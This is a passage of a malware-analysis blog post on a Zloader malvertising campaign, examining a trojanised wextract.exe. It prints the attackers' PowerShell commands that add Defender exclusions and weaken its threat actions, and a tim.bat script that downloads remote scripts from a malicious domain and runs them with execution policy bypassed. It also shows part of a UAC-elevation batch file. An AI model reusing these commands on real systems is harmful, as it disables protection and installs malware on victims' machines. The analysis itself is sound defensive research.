“Add-MpPreference -ExclusionProcess “regsvr32””powershell.exe -command “Add-MpPreference -ExclusionProcess “regsvr32*””powershell.exe -command “Add-MpPreference -ExclusionProcess “.exe””powershell.exe -command “Add-MpPreference -ExclusionProcess “iexplorer.exe””powershell.exe -command “Add-MpPreference -ExclusionProcess “explorer.exe””powershell.exe -command “Add-MpPreference -ExclusionProcess “.dll””powershell.exe -command “Add-MpPreference -ExclusionProcess “*.dll””powershell.exe -command “Add-MpPreference -ExclusionProcess “*.exe””powershell.exe -command “Set-MpPreference -HighThreatDefaultAction 6 -Force”powershell.exe -command “Set-MpPreference -ModerateThreatDefaultAction 6”powershell.exe -command “Set-MpPreference -LowThreatDefaultAction 6”powershell.exe -command “Set-MpPreference -SevereThreatDefaultAction 6”powershell.exe -command “Set-MpPreference -ScanScheduleDay 8”</span></code></pre></figure>
+
+<p>It is clear that the command disables Microsoft Defender features and adds exclusions. For the changes to take effect, the commands require local administrator privileges on the victim computer, however we have learned about the malvertisment distribution, so the users are very likely going to grant the permissions at installation. Company/family computers with locked down permissions are luckier in this case.</p>
+
+<p>Furthermore, SentinelOne reports the download of:</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="n">hxxps</span><span class="ss">:/</span><span class="o">/</span><span class="n">pornofilmspremium</span><span class="p">.</span><span class="nf">com</span><span class="o">/</span><span class="n">tim</span><span class="o">.</span><span class="no">EXE</span><span class="err">”</span></code></pre></figure>
+
+<p>saved as “tim.exe”. The execution of the “tim.exe” is done through the LOLBAS command</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="err">“</span><span class="n">explorer</span><span class="p">.</span><span class="nf">exe</span> <span class="n">tim</span><span class="p">.</span><span class="nf">exe</span></code></pre></figure>
+
+<p>Which is now available for download:</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="n">tim</span><span class="o">.</span><span class="no">EXE</span>
+<span class="no">SHA256</span><span class="p">:</span> <span class="n">ba1e4fd49e7c2aebd06ad3e22e6cf8f4d433fa57c6cc45167c9859c7f35eaa2f</span> </code></pre></figure>
+
+<p><a href="https://www.virustotal.com/gui/file/ba1e4fd49e7c2aebd06ad3e22e6cf8f4d433fa57c6cc45167c9859c7f35eaa2f">VirusTotal 43/66</a></p>
+
+<p>To get back on track with our analysis, we needed to acquire the samples, and according to VT the following files were associated with the campaign’s URL according to VT relations:</p>
+
+<p>https://www.virustotal.com/gui/file/08e36ff67e180fe107f8d9012c765b2062dc1b85618179ed065419c1229f2300 
+17 days ago</p>
+
+<p>https://www.virustotal.com/gui/file/ba1e4fd49e7c2aebd06ad3e22e6cf8f4d433fa57c6cc45167c9859c7f35eaa2f
+2 days ago</p>
+
+<p>https://www.virustotal.com/gui/file/d7de4dd0a7f8c61fd78ac47ae6fb3924d1370e95de451c925161b8bd8a46f3bf
+1 day ago</p>
+
+<p>The second one matches the analysis of SentinelOne, so we will pick the latest one.
+https://www.virustotal.com/gui/file/d7de4dd0a7f8c61fd78ac47ae6fb3924d1370e95de451c925161b8bd8a46f3bf/detection</p>
+
+<h2 id="vt-graph">VT Graph</h2>
+<p>(courtesy of <a href="https://www.virustotal.com/gui/user/octohat">octohat</a>)</p>
+
+<p><img src="/assets/img/zloader_vtgraph.png" alt="zloader_vtgraph" /></p>
+
+<p>Loading the file to Ghidra results in a missing PDB Symbol reference.</p>
+
+<p><img src="/assets/img/zloader_ghidra.png" alt="zloader_ghidra" /></p>
+
+<p>In the readable data section we can find some text related to wextract.pdb:</p>
+
+<p><img src="/assets/img/zloader_rdata.png" alt="zloader_rdata" /></p>
+
+<p>Unfortunately, symbols for wextract.exe are not available in C:\symbols, and we are out of luck this time.</p>
+
+<p><img src="/assets/img/zloader_symbols.png" alt="zloader_symbols" /></p>
+
+<p>Wextract.exe works with the extraction of .cab files. In line with this, we can also find the following text extracted:</p>
+
+<p><img src="/assets/img/zloader_russian_text.png" alt="zloader_russian_text" /></p>
+
+<p>Which translates to:</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="mi">1000</span> <span class="no">Select</span> <span class="n">a</span> <span class="n">folder</span> <span class="n">to</span> <span class="n">save</span> <span class="n">the</span> <span class="n">extracted</span> <span class="n">files</span><span class="o">.</span>
+<span class="mi">1001</span><span class="o">%</span> <span class="n">s</span>
+<span class="mi">1200</span> <span class="no">Unable</span> <span class="n">to</span> <span class="n">retrieve</span> <span class="n">disk</span> <span class="n">space</span> <span class="n">availability</span> <span class="n">from</span><span class="ss">:%</span> <span class="n">s</span><span class="o">.</span> <span class="p">\</span> <span class="no">N</span> <span class="p">\</span> <span class="n">nSystem</span> <span class="n">message</span><span class="ss">:%</span> <span class="n">s</span><span class="o">.</span>
+<span class="mi">1201</span> <span class="no">The</span> <span class="n">requested</span> <span class="n">resource</span> <span class="n">could</span> <span class="n">not</span> <span class="n">be</span> <span class="n">found</span><span class="o">.</span>
+<span class="mi">1202</span> <span class="no">Are</span> <span class="n">you</span> <span class="n">sure</span> <span class="n">you</span> <span class="n">want</span> <span class="n">to</span> <span class="n">cancel?</span>
+<span class="mi">1204</span> <span class="no">The</span> <span class="n">operating</span> <span class="nb">system</span> <span class="n">version</span> <span class="n">information</span> <span class="n">could</span> <span class="n">not</span> <span class="n">be</span> <span class="n">obtained</span><span class="o">.</span>
+<span class="mi">1205</span> <span class="no">Failed</span> <span class="n">to</span> <span class="n">get</span> <span class="n">memory</span> <span class="n">request</span><span class="o">.</span>
+<span class="mi">1208</span> <span class="no">Unable</span> <span class="n">to</span> <span class="n">create</span> <span class="n">a</span> <span class="n">fetch</span> <span class="n">stream</span><span class="o">.</span>
+<span class="mi">1210</span> <span class="no">Invalid</span> <span class="no">Cab</span> <span class="n">file</span><span class="o">.</span>
+<span class="mi">1211</span> <span class="no">File</span> <span class="n">table</span> <span class="n">overflow</span><span class="o">.</span>
+<span class="mi">1212</span> <span class="no">Failed</span> <span class="n">to</span> <span class="n">navigate</span> <span class="n">to</span> <span class="n">folder</span><span class="o">.</span>
+<span class="mi">1213</span> <span class="no">Could</span> <span class="n">not</span> <span class="n">find</span> <span class="n">a</span> <span class="n">disk</span> <span class="n">that</span> <span class="n">has</span><span class="o">%</span> <span class="n">s</span> <span class="no">KB</span> <span class="n">of</span> <span class="n">free</span> <span class="n">space</span> <span class="k">for</span> <span class="n">installing</span> <span class="n">the</span> <span class="n">program</span><span class="o">.</span> <span class="no">Free</span> <span class="n">some</span> <span class="n">space</span> <span class="n">and</span> <span class="n">press</span> <span class="n">the</span> <span class="k">retry</span> <span class="n">button</span><span class="o">.</span> <span class="no">Press</span> <span class="n">the</span> <span class="n">cancel</span> <span class="n">button</span> <span class="n">to</span> <span class="nb">exit</span><span class="o">.</span>
+<span class="mi">1214</span> <span class="no">This</span> <span class="n">folder</span> <span class="n">is</span> <span class="n">invalid</span><span class="o">.</span> <span class="no">Make</span> <span class="n">sure</span> <span class="n">the</span> <span class="n">folder</span> <span class="n">exists</span> <span class="n">and</span> <span class="n">is</span> <span class="n">writable</span><span class="o">.</span>
+<span class="mi">1215</span> <span class="no">Specify</span> <span class="n">the</span> <span class="n">full</span> <span class="n">path</span> <span class="n">to</span> <span class="n">the</span> <span class="n">folder</span> <span class="n">or</span> <span class="n">click</span> <span class="no">Cancel</span><span class="o">.</span>
+<span class="mi">1216</span> <span class="no">Failed</span> <span class="n">to</span> <span class="n">update</span> <span class="n">the</span> <span class="n">folder</span> <span class="n">input</span> <span class="n">field</span><span class="o">.</span>
+<span class="mi">1217</span> <span class="no">Failed</span> <span class="n">to</span> <span class="nb">load</span> <span class="n">functions</span> <span class="k">for</span> <span class="n">the</span> <span class="n">browser</span> <span class="n">dialog</span><span class="o">.</span>
+<span class="mi">1218</span> <span class="no">Failed</span> <span class="n">to</span> <span class="nb">load</span> <span class="n">the</span> <span class="no">Shell32</span><span class="o">.</span><span class="no">DLL</span> <span class="k">for</span> <span class="n">the</span> <span class="n">browser</span> <span class="n">dialog</span><span class="o">.</span>
+<span class="mi">1220</span> <span class="no">Failed</span> <span class="n">to</span> <span class="n">create</span> <span class="n">process</span> <span class="o">&lt;</span><span class="sx">% s&gt;. </span><span class="no">Reason</span><span class="ss">:%</span> <span class="n">s</span>
+<span class="mi">1221</span> <span class="no">The</span> <span class="n">cluster</span> <span class="n">size</span> <span class="n">is</span> <span class="n">not</span> <span class="n">supported</span> <span class="n">on</span> <span class="n">this</span> <span class="nb">system</span><span class="o">.</span>
+<span class="mi">1222</span> <span class="no">The</span> <span class="n">requested</span> <span class="n">resource</span> <span class="n">is</span> <span class="n">corrupted</span><span class="o">.</span>
+<span class="mi">1223</span> <span class="no">Installation</span> <span class="n">requires</span> <span class="no">Windows</span> <span class="mi">95</span> <span class="n">or</span> <span class="no">Windows</span> <span class="no">NT</span> <span class="mf">4.0</span> <span class="no">Beta</span> <span class="mi">2</span><span class="o">.</span>
+<span class="mi">1224</span> <span class="no">Error</span> <span class="n">loading</span><span class="o">%</span> <span class="n">s</span>
+<span class="mi">1225</span> <span class="no">GetProcAddress</span> <span class="p">()</span> <span class="n">failed</span> <span class="k">for</span> <span class="n">function</span> <span class="s1">'% s'</span><span class="o">.</span> <span class="no">Possible</span> <span class="ss">causes: </span><span class="no">Incorrect</span> <span class="n">version</span> <span class="n">of</span> <span class="n">advpack</span><span class="p">.</span><span class="nf">dll</span><span class="o">.</span>
+<span class="mi">1226</span> <span class="no">Installation</span> <span class="n">requires</span> <span class="no">Windows</span> <span class="mi">95</span> <span class="n">or</span> <span class="no">Windows</span> <span class="no">NT</span><span class="o">.</span>
+<span class="mi">1227</span> <span class="no">Failed</span> <span class="n">to</span> <span class="n">create</span> <span class="n">folder</span> <span class="s1">'% s'</span>
+<span class="mi">1228</span> <span class="no">The</span> <span class="n">program</span> <span class="n">requires</span><span class="o">%</span> <span class="n">s</span> <span class="no">KB</span> <span class="n">of</span> <span class="n">disk</span> <span class="n">space</span><span class="o">%</span> <span class="n">s</span> <span class="n">to</span> <span class="n">install</span><span class="o">.</span> <span class="no">Free</span> <span class="n">up</span> <span class="n">some</span> <span class="n">space</span> <span class="n">to</span> <span class="n">continue</span><span class="o">.</span> <span class="p">\</span> <span class="n">n</span> <span class="p">\</span> <span class="n">nDo</span> <span class="n">you</span> <span class="n">want</span> <span class="n">to</span> <span class="n">continue?</span>
+<span class="mi">1264</span> <span class="no">Error</span> <span class="n">getting</span> <span class="no">Windows</span> <span class="n">folder</span>
+<span class="mi">1269</span> <span class="no">NT</span> <span class="ss">shutdown: </span><span class="no">OpenProcessToken</span> <span class="n">error</span><span class="o">.</span>
+<span class="mi">1270</span> <span class="no">NT</span> <span class="ss">shutdown: </span><span class="no">AdjustTokenPrivileges</span> <span class="n">error</span><span class="o">.</span>
+<span class="mi">1271</span> <span class="no">NT</span> <span class="ss">shutdown: </span><span class="no">ExitWindowsEx</span> <span class="n">error</span><span class="o">.</span>
+<span class="mi">1272</span> <span class="no">Failed</span> <span class="n">to</span> <span class="n">extract</span> <span class="n">file</span><span class="o">.</span> <span class="no">There</span> <span class="n">is</span> <span class="n">probably</span> <span class="n">not</span> <span class="n">enough</span> <span class="n">memory</span> <span class="p">(</span><span class="n">no</span> <span class="n">disk</span> <span class="n">space</span> <span class="k">for</span> <span class="n">the</span> <span class="n">paging</span> <span class="n">file</span><span class="p">)</span> <span class="n">or</span> <span class="n">the</span> <span class="no">Cab</span> <span class="n">file</span> <span class="n">is</span> <span class="n">corrupted</span><span class="o">.</span>
+<span class="mi">1273</span> <span class="no">Setup</span> <span class="n">was</span> <span class="n">unable</span> <span class="n">to</span> <span class="n">retrieve</span> <span class="n">volume</span> <span class="n">information</span> <span class="k">for</span> <span class="n">disk</span> <span class="p">(</span><span class="sx">% s). </span><span class="p">\</span> <span class="n">nSystem</span> <span class="n">message</span><span class="ss">:%</span> <span class="n">s</span><span class="o">.</span>
+<span class="mi">1274</span> <span class="no">The</span> <span class="n">installer</span> <span class="n">cannot</span> <span class="n">find</span> <span class="n">a</span> <span class="n">disk</span> <span class="n">with</span><span class="o">%</span> <span class="n">s</span> <span class="no">KB</span> <span class="n">of</span> <span class="n">free</span> <span class="n">space</span> <span class="n">to</span> <span class="n">install</span> <span class="n">the</span> <span class="n">program</span><span class="o">.</span> <span class="no">Free</span> <span class="n">up</span> <span class="n">space</span> <span class="n">and</span> <span class="k">retry</span> <span class="n">the</span> <span class="n">operation</span><span class="o">.</span>
+<span class="mi">1275</span> <span class="no">The</span> <span class="n">installer</span> <span class="n">is</span> <span class="n">corrupted</span><span class="o">.</span> <span class="no">Please</span> <span class="n">contact</span> <span class="n">the</span> <span class="n">vendor</span> <span class="n">of</span> <span class="n">the</span> <span class="n">application</span><span class="o">.</span>
+<span class="mi">1312</span> <span class="no">Command</span> <span class="n">line</span> <span class="n">syntax</span> <span class="n">error</span><span class="o">.</span> <span class="no">Enter</span> <span class="no">Command</span> <span class="sr">/? For help.
+1313 Command line parameters: \ n \ n /</span> <span class="no">Q</span> <span class="o">-</span> <span class="no">Quiet</span> <span class="n">mode</span><span class="p">,</span> <span class="p">\</span> <span class="n">n</span> <span class="p">\</span> <span class="n">n</span> <span class="o">/</span> <span class="no">T</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">full</span> <span class="n">path</span><span class="o">&gt;</span> <span class="o">-</span> <span class="no">Temporary</span> <span class="n">working</span> <span class="n">folder</span><span class="p">,</span> <span class="p">\</span> <span class="n">n</span> <span class="p">\</span> <span class="n">n</span> <span class="o">/</span> <span class="no">C</span> <span class="o">-</span> <span class="no">Extract</span> <span class="n">files</span> <span class="n">only</span> <span class="n">to</span> <span class="n">folder</span> <span class="k">when</span> <span class="n">used</span> <span class="n">together</span> <span class="n">with</span> <span class="sr">/T.\n\n/</span><span class="no">C</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">command</span><span class="o">&gt;</span> <span class="o">-</span> <span class="no">Replace</span> <span class="n">the</span> <span class="n">installation</span> <span class="n">command</span> <span class="n">specified</span> <span class="n">by</span> <span class="n">the</span> <span class="n">author</span><span class="o">.</span> <span class="p">\</span> <span class="no">N</span>
+<span class="mi">1314</span> <span class="no">You</span> <span class="n">must</span> <span class="n">restart</span> <span class="n">your</span> <span class="n">computer</span> <span class="k">for</span> <span class="n">the</span> <span class="n">new</span> <span class="n">settings</span> <span class="n">to</span> <span class="n">take</span> <span class="n">effect</span><span class="o">.</span> <span class="p">\</span> <span class="no">N</span> <span class="p">\</span> <span class="n">nDo</span> <span class="n">you</span> <span class="n">want</span> <span class="n">to</span> <span class="k">do</span> <span class="n">this</span> <span class="n">now?</span>
+<span class="mi">1316</span> <span class="no">Another</span> <span class="n">copy</span> <span class="n">of</span> <span class="n">package</span> <span class="s1">'% s'</span> <span class="n">is</span> <span class="n">already</span> <span class="n">running</span> <span class="n">on</span> <span class="n">your</span> <span class="nb">system</span><span class="o">.</span> <span class="no">Do</span> <span class="n">you</span> <span class="n">want</span> <span class="n">to</span> <span class="n">run</span> <span class="n">another</span> <span class="n">copy?</span>
+<span class="mi">1317</span> <span class="no">Could</span> <span class="n">not</span> <span class="n">find</span> <span class="n">file</span><span class="ss">:%</span> <span class="n">s</span><span class="o">.</span>
+<span class="mi">1351</span> <span class="no">You</span> <span class="k">do</span> <span class="n">not</span> <span class="n">have</span> <span class="n">administrator</span> <span class="n">rights</span> <span class="n">on</span> <span class="n">this</span> <span class="n">computer</span><span class="o">.</span> <span class="no">Some</span> <span class="n">settings</span> <span class="n">can</span> <span class="n">only</span> <span class="n">be</span> <span class="n">done</span> <span class="n">by</span> <span class="n">an</span> <span class="n">administrator</span><span class="o">.</span>
+<span class="mi">1354</span> <span class="no">The</span> <span class="n">folder</span> <span class="s1">'% s'</span> <span class="n">does</span> <span class="n">not</span> <span class="n">exist</span><span class="o">.</span> <span class="no">Do</span> <span class="n">you</span> <span class="n">want</span> <span class="n">to</span> <span class="n">create</span> <span class="n">it?</span>
+<span class="mi">1355</span> <span class="no">Another</span> <span class="n">copy</span> <span class="n">of</span> <span class="n">package</span> <span class="s1">'% s'</span> <span class="n">is</span> <span class="n">already</span> <span class="n">running</span><span class="o">.</span> <span class="no">You</span> <span class="n">cannot</span> <span class="n">run</span> <span class="n">multiple</span> <span class="n">copies</span> <span class="n">at</span> <span class="n">once</span><span class="o">.</span>
+<span class="mi">1356</span> <span class="no">Package</span> <span class="s1">'% s'</span> <span class="n">is</span> <span class="n">incompatible</span> <span class="n">with</span> <span class="n">the</span> <span class="n">version</span> <span class="n">of</span> <span class="no">Windows</span> <span class="n">you</span> <span class="n">are</span> <span class="n">using</span><span class="o">.</span>
+<span class="mi">1357</span> <span class="no">Package</span> <span class="s1">'% s'</span> <span class="n">is</span> <span class="n">incompatible</span> <span class="n">with</span> <span class="n">version</span> <span class="n">of</span> <span class="n">file</span><span class="ss">:%</span> <span class="n">s</span> <span class="n">on</span> <span class="n">your</span> <span class="nb">system</span><span class="o">.</span> </code></pre></figure>
+
+<p>It looks like the Russian error codes for wextract.exe. Every packaged executable on Windows will need to come with certain resources for it to run on different language sets, etc.</p>
+
+<p>A quick comparison of the legitimate wextract.exe and our newly found friend reveals, that the Sections are pretty similar:</p>
+
+<p>Legitimate wextract.exe(from System32) Sections on VirusTotal:</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="o">|</span> <span class="no">Name</span>   <span class="o">|</span> <span class="no">Virtual</span> <span class="no">Address</span> <span class="o">|</span> <span class="no">Virtual</span> <span class="no">Size</span> <span class="o">|</span> <span class="no">Raw</span> <span class="no">Size</span> <span class="o">|</span> <span class="no">Entropy</span> <span class="o">|</span> <span class="no">MD5</span>                              <span class="o">|</span> <span class="no">Chi2</span>      <span class="o">|</span>
+<span class="o">|--------|-----------------|--------------|----------|---------|----------------------------------|-----------|</span>
+<span class="o">|</span> <span class="p">.</span><span class="nf">text</span>  <span class="o">|</span> <span class="mi">4096</span>            <span class="o">|</span> <span class="mi">31616</span>        <span class="o">|</span> <span class="mi">31744</span>    <span class="o">|</span> <span class="mf">6.1</span>     <span class="o">|</span> <span class="mi">60800</span><span class="n">deac1fde21b98089f2241ee6168</span> <span class="o">|</span> <span class="mf">327382.78</span> <span class="o">|</span>
+<span class="o">|</span> <span class="p">.</span><span class="nf">rdata</span> <span class="o">|</span> <span class="mi">36864</span>           <span class="o">|</span> <span class="mi">8904</span>         <span class="o">|</span> <span class="mi">9216</span>     <span class="o">|</span> <span class="mf">4.73</span>    <span class="o">|</span> <span class="mi">59</span><span class="n">d15cdf89780817c3d48dd588a6a129</span> <span class="o">|</span> <span class="mf">453786.75</span> <span class="o">|</span>
+<span class="o">|</span> <span class="p">.</span><span class="nf">data</span>  <span class="o">|</span> <span class="mi">49152</span>           <span class="o">|</span> <span class="mi">7936</span>         <span class="o">|</span> <span class="mi">1024</span>     <span class="o">|</span> <span class="mf">3.19</span>    <span class="o">|</span> <span class="mi">9</span><span class="n">d1580dccaf8e787a43caf4bba48a079</span> <span class="o">|</span> <span class="mf">88083.5</span>   <span class="o">|</span>
+<span class="o">|</span> <span class="p">.</span><span class="nf">pdata</span> <span class="o">|</span> <span class="mi">57344</span>           <span class="o">|</span> <span class="mi">1032</span>         <span class="o">|</span> <span class="mi">1536</span>     <span class="o">|</span> <span class="mf">3.16</span>    <span class="o">|</span> <span class="mi">15</span><span class="n">cd12257317071f28e4f7b728f8825e</span> <span class="o">|</span> <span class="mf">174138.23</span> <span class="o">|</span>
+<span class="o">|</span> <span class="p">.</span><span class="nf">rsrc</span>  <span class="o">|</span> <span class="mi">61440</span>           <span class="o">|</span> <span class="mi">101808</span>       <span class="o">|</span> <span class="mi">101888</span>   <span class="o">|</span> <span class="mf">7.16</span>    <span class="o">|</span> <span class="mi">727</span><span class="n">dc062037ddbd2402841ef2b2e7a84</span> <span class="o">|</span> <span class="mf">748535.13</span> <span class="o">|</span>
+<span class="o">|</span> <span class="p">.</span><span class="nf">reloc</span> <span class="o">|</span> <span class="mi">163840</span>          <span class="o">|</span> <span class="mi">32</span>           <span class="o">|</span> <span class="mi">512</span>      <span class="o">|</span> <span class="mf">0.41</span>    <span class="o">|</span> <span class="mi">637787151</span><span class="n">ee546a94902de9694a58fd6</span> <span class="o">|</span> <span class="mi">119087</span>    <span class="o">|</span></code></pre></figure>
+
+<p>Malicious wextract.exe Sections on VirusTotal:</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="o">|</span> <span class="no">Name</span>   <span class="o">|</span> <span class="no">Virtual</span> <span class="no">Address</span> <span class="o">|</span> <span class="no">Virtual</span> <span class="no">Size</span> <span class="o">|</span> <span class="no">Raw</span> <span class="no">Size</span> <span class="o">|</span> <span class="no">Entropy</span> <span class="o">|</span> <span class="no">MD5</span>                              <span class="o">|</span> <span class="no">Chi2</span>       <span class="o">|</span>
+<span class="o">|--------|-----------------|--------------|----------|---------|----------------------------------|------------|</span>
+<span class="o">|</span> <span class="p">.</span><span class="nf">text</span>  <span class="o">|</span> <span class="mi">4096</span>            <span class="o">|</span> <span class="mi">31616</span>        <span class="o">|</span> <span class="mi">31744</span>    <span class="o">|</span> <span class="mf">6.1</span>     <span class="o">|</span> <span class="mi">60800</span><span class="n">deac1fde21b98089f2241ee6168</span> <span class="o">|</span> <span class="mf">327382.78</span>  <span class="o">|</span>
+<span class="o">|</span> <span class="p">.</span><span class="nf">rdata</span> <span class="o">|</span> <span class="mi">36864</span>           <span class="o">|</span> <span class="mi">8904</span>         <span class="o">|</span> <span class="mi">9216</span>     <span class="o">|</span> <span class="mf">4.73</span>    <span class="o">|</span> <span class="mi">59</span><span class="n">d15cdf89780817c3d48dd588a6a129</span> <span class="o">|</span> <span class="mf">453786.75</span>  <span class="o">|</span>
+<span class="o">|</span> <span class="p">.</span><span class="nf">data</span>  <span class="o">|</span> <span class="mi">49152</span>           <span class="o">|</span> <span class="mi">7936</span>         <span class="o">|</span> <span class="mi">1024</span>     <span class="o">|</span> <span class="mf">3.19</span>    <span class="o">|</span> <span class="mi">9</span><span class="n">d1580dccaf8e787a43caf4bba48a079</span> <span class="o">|</span> <span class="mf">88083.5</span>    <span class="o">|</span>
+<span class="o">|</span> <span class="p">.</span><span class="nf">pdata</span> <span class="o">|</span> <span class="mi">57344</span>           <span class="o">|</span> <span class="mi">1032</span>         <span class="o">|</span> <span class="mi">1536</span>     <span class="o">|</span> <span class="mf">3.16</span>    <span class="o">|</span> <span class="mi">15</span><span class="n">cd12257317071f28e4f7b728f8825e</span> <span class="o">|</span> <span class="mf">174138.23</span>  <span class="o">|</span>
+<span class="o">|</span> <span class="p">.</span><span class="nf">rsrc</span>  <span class="o">|</span> <span class="mi">61440</span>           <span class="o">|</span> <span class="mi">126976</span>       <span class="o">|</span> <span class="mi">123904</span>   <span class="o">|</span> <span class="mf">6.88</span>    <span class="o">|</span> <span class="n">ee6788d03a54b3bede80bda534eb2831</span> <span class="o">|</span> <span class="mf">1357936.75</span> <span class="o">|</span>
+<span class="o">|</span> <span class="p">.</span><span class="nf">reloc</span> <span class="o">|</span> <span class="mi">188416</span>          <span class="o">|</span> <span class="mi">32</span>           <span class="o">|</span> <span class="mi">512</span>      <span class="o">|</span> <span class="mf">0.41</span>    <span class="o">|</span> <span class="mi">637787151</span><span class="n">ee546a94902de9694a58fd6</span> <span class="o">|</span> <span class="mi">119087</span>     <span class="o">|</span></code></pre></figure>
+
+<p>Legitimate wextract.exe Resources:</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="no">User</span><span class="p">\</span><span class="no">Downloads</span><span class="p">\</span><span class="mi">5712144282845184</span><span class="p">\</span><span class="n">wextract</span><span class="p">\.</span><span class="nf">rsrc</span><span class="o">&gt;</span><span class="n">tree</span> <span class="sr">/F
+Folder PATH listing
+Volume serial number is E411-13D6
+C:.
+│   version.txt
+│
+├───AVI
+│       3001
+│
+├───GROUP_ICON
+│       3000
+│
+├───ICON
+│       1.ico
+│       10.ico
+│       11.ico
+│       12.ico
+│       13.ico
+│       2.ico
+│       3.ico
+│       4.ico
+│       5.ico
+│       6.ico
+│       7.ico
+│       8.ico
+│       9
+│
+├───MANIFEST
+│       1
+│
+└───MUI
+        1</span></code></pre></figure>
+
+<p>Malicious wextract.exe Resources:</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="no">User</span><span class="p">\</span><span class="no">Downloads</span><span class="p">\</span><span class="mi">5712144282845184</span><span class="p">\</span><span class="n">extract</span><span class="p">\.</span><span class="nf">rsrc</span><span class="o">&gt;</span><span class="n">tree</span> <span class="sr">/F
+Folder PATH listing
+Volume serial number is E411-13D6
+C:.
+├───1033
+│   │   version.txt
+│   │
+│   ├───AVI
+│   │       3001
+│   │
+│   ├───GROUP_ICON
+│   │       3000
+│   │
+│   ├───ICON
+│   │       1.ico
+│   │       10.ico
+│   │       11.ico
+│   │       12.ico
+│   │       13.ico
+│   │       2.ico
+│   │       3.ico
+│   │       4.ico
+│   │       5.ico
+│   │       6.ico
+│   │       7.ico
+│   │       8.ico
+│   │       9
+│   │
+│   ├───MANIFEST
+│   │       1
+│   │
+│   └───RCDATA
+│           ADMQCMD
+│           POSTRUNPROGRAM
+│           RUNPROGRAM
+│           USRQCMD
+│
+├───1049
+│   │   string.txt
+│   │   version.txt
+│   │
+│   └───DIALOG
+│           2001
+│           2002
+│           2003
+│           2004
+│           2005
+│           2006
+│
+└───2057
+    │   string.txt
+    │   version.txt
+    │
+    ├───DIALOG
+    │       2001
+    │       2002
+    │       2003
+    │       2004
+    │       2005
+    │       2006
+    │
+    └───RCDATA
+            CABINET
+            EXTRACTOPT
+            FILESIZES
+            FINISHMSG
+            LICENSE
+            PACKINSTSPACE
+            REBOOT
+            SHOWWINDOW
+            TITLE
+            UPROMPT</span></code></pre></figure>
+
+<p>The differences are where malicious content is embedded, starting from RCDATA.</p>
+
+<p>A more elegant way to explore this is with Resource Hacker:
+<img src="/assets/img/zloader_resourcehacker.png" alt="zloader_resourcehacker" /></p>
+
+<p>We got the answer that the malware is actually bundled together with the legitimate C:\Windows\System32\wextract.exe Windows binary.</p>
+
+<p>The diff of the components can be also extracted, and in the RCDATA there are some content of interest. RUNPROGRAM will execute:</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="n">cmd</span> <span class="sr">/c tim.bat</span></code></pre></figure>
+
+<p><img src="/assets/img/zloader_RUNPROGRAM.png" alt="zloader_RUNPROGRAM" /></p>
+
+<p>Yet again, with simply 7z you can extract the content of the file:</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="n">extract</span><span class="p">\.</span><span class="nf">rsrc</span><span class="p">\</span><span class="mi">2057</span><span class="p">\</span><span class="no">RCDATA</span><span class="p">\</span><span class="no">CABINET</span></code></pre></figure>
+
+<p>Which is resulting in tim.bat, which has the following content:</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="n">cd</span> <span class="s2">"%USERPROFILE%</span><span class="se">\A</span><span class="s2">ppData</span><span class="se">\R</span><span class="s2">oaming
+powershell Invoke-WebRequest https://pornofilmspremium.com/123.ps1 -OutFile 123.ps1
+PowerShell -NoProfile -ExecutionPolicy Bypass -Command "</span><span class="o">&amp;</span> <span class="s1">'./123.ps1'</span><span class="s2">"
+
+timeout 150
+powershell Invoke-WebRequest https://pornofilmspremium.com/nsudo.bat -OutFile nsudo.bat
+
+cmd /c nsudo.bat
+timeout 10
+cmd /c nsudo.bat
+timeout 10
+cmd /c nsudo.bat
+timeout 10 
+cmd /c nsudo.bat
+timeout 10
+
+... omitted 15 repeated cmd+timeout commands ...</span></code></pre></figure>
+
+<p>So tim.bat will download 2 files:</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="mi">123</span><span class="p">.</span><span class="nf">ps1</span>
+<span class="n">nsudo</span><span class="p">.</span><span class="nf">bat</span></code></pre></figure>
+
+<p>The latter, nsudo.bat is still available on the site.</p>
+
+<p>nsudo.bat’s content:</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="vi">@echo</span> <span class="n">off</span>
+<span class="n">title</span> <span class="no">Installing</span> <span class="no">Packages</span> 
+<span class="o">::</span> <span class="no">BatchGotAdmin</span>
+<span class="o">::-------------------------------------</span>
+<span class="no">REM</span>  <span class="o">--&gt;</span> <span class="no">Check</span> <span class="k">for</span> <span class="n">permission</span>
+<span class="o">&gt;</span><span class="n">nul</span> <span class="mi">2</span><span class="o">&gt;&amp;</span><span class="mi">1</span> <span class="s2">"%SYSTEMROOT%</span><span class="se">\s</span><span class="s2">ystem32</span><span class="se">\c</span><span class="s2">acls.exe"</span> <span class="s2">"%SYSTEMROOT%</span><span class="se">\s</span><span class="s2">ystem32</span><span class="se">\c</span><span class="s2">onfig</span><span class="se">\s</span><span class="s2">ystem"</span>
+
+<span class="no">REM</span> <span class="o">--&gt;</span> <span class="no">If</span> <span class="n">error</span> <span class="n">flag</span> <span class="n">set</span><span class="p">,</span> <span class="n">we</span> <span class="k">do</span> <span class="n">not</span> <span class="n">have</span> <span class="n">admin</span><span class="p">.</span>
+<span class="nf">if</span> <span class="s1">'%errorlevel%'</span> <span class="no">NEQ</span> <span class="s1">'0'</span> <span class="p">(</span>
+    <span class="n">echo</span> <span class="no">Requesting</span> <span class="n">administrative</span> <span class="n">privileges</span><span class="o">...</span><span class="p">.</span>
+    <span class="nf">goto</span> <span class="no">UACPrompt</span>
